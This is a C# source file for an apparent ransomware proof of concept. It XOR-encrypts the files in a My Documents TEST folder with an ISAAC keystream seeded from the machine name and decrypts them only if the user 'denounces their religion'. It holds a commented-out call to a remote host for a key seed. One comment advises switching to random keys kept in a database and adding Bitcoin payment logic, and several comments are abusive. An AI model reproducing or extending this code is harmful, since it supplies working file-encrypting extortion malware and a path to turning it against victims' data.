using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace DUMB
{
    static class Program
    {
        public const int TUMBLE = 3; //Tumble ISAAC this many times before and after injecting the seed (poor Isaac, fighting his crazy mother and now this)
        public const int BUFFER_SIZE = 512;

        [STAThread]
        static void Main()
        {
            if (!HackTheGibson()) return; //Check if we need to crypt all the files

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Main main = new Main();
            Application.Run(main);

            if (!main.denounced) MessageBox.Show("You did not denounce your religion and as such your files have not been decrypted", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            else
            {
                HackTheGibson(true); //Decrypt it this time

                MessageBox.Show("Your files have been decrypted", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        static ISAAC PassTheKeysBro() //Remember kids, never drink and program (unless you're developing on Windows ME, in which case it is fully justified)
        {
            string seed;
            //using (System.Net.WebClient w = new WebClient()) seed = w.DownloadString("http://someshittydomain.info/?getseed=" + Environment.MachineName);
            seed = Environment.MachineName; //Don't do this if you feel like being a 12 year old skid and actually try and infect people with this, use randomly generated keys and store them in a MySQL database and add some Bitcoin logic to it you fat lumpy bitch-knuckles.

            byte[] realseed = Encoding.UTF8/*Is the machine name stored in UTF8 or ASCII?*/.GetBytes(seed);

            ISAAC csprng = new ISAAC();

            for (int i = 0; i < TUMBLE; i++)
                csprng.Isaac(); //Why not?

            for (int i = 0; i < realseed.Length; i++)
                csprng.mem[i] = realseed[i]; //Inject the seed into Isaac

            seed = null; realseed = null; //Push out of scope for GC

            for (int i = 0; i < TUMBLE; i++)
                csprng.Isaac(); //Some more tumbling

            return csprng;
        }

        static bool HackTheGibson(bool decrypt = false)
        {
            /* Grab the location for MyDocs (+ \TEST\ because this is a PoC), iterate files and crypt them*/
            string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            string folder = docs + @"\TEST\";

            if (!Directory.Exists(folder))
            {
                MessageBox.Show("Put a folder in My Documents called 'TEST' and chuck any files you want to get fucked up in there and next time read the god damn README", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            if (!decrypt && File.Exists(folder + "crypted")) return true; //There's no way to know if the files are actually crypted or not, so we'll use a file

            /* Generate the key */
            ISAAC csprng = PassTheKeysBro();

            string[] files = Directory.GetFiles(folder); //I'm not actually sure if foreach would execute this on each enumeration, I'll assume it does
            foreach (string file in files)
            {
                if (Path.GetFileName(file) == "crypted") continue;
                CryptFile(csprng, file);
            }

            if (!decrypt) File.Create(folder + "crypted").Close();
            else if (File.Exists(folder + "crypted")) File.Delete(folder + "crypted");

            for (int i = 0; i < ISAAC.SIZE; i++)
                csprng.mem[i] = 0; //Zero out ISAAC so it's not in the memory

            return true;
        }

        //If you're wondering why I don't just make a static ISAAC, programming it this way makes it easier to skid and I can push it out of scope for the GC and zero it and whatever
        static void CryptFile(ISAAC csprng, string loc) //XOR works both ways, so we don't need one function for Encrypting and one function for Decrypting, they're both the same thing for XORing
        {
            FileStream s = null;
            try
            {
                s = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);

                byte[] buffer = new byte[ISAAC.SIZE];
                int read = s.Read(buffer, 0, ISAAC.SIZE);
                do {
                    csprng.Isaac();

                    for (int i = 0; i < read; i++)
                        buffer[i] = (byte)((buffer[i] ^ csprng.mem[i]) % 256);

                    s.Seek(-read, SeekOrigin.Current);
                    s.Write(buffer, 0, read);
                } while ((read = s.Read(buffer, 0, ISAAC.SIZE)) > 0);
            }
            catch { return; } //Suffocate errors like a small infant so it will stop crying if something happens
            finally
            {
                if (s != null)
                {
                    s.Close();
                    s.Dispose();
                }
            }
        }
    }
}
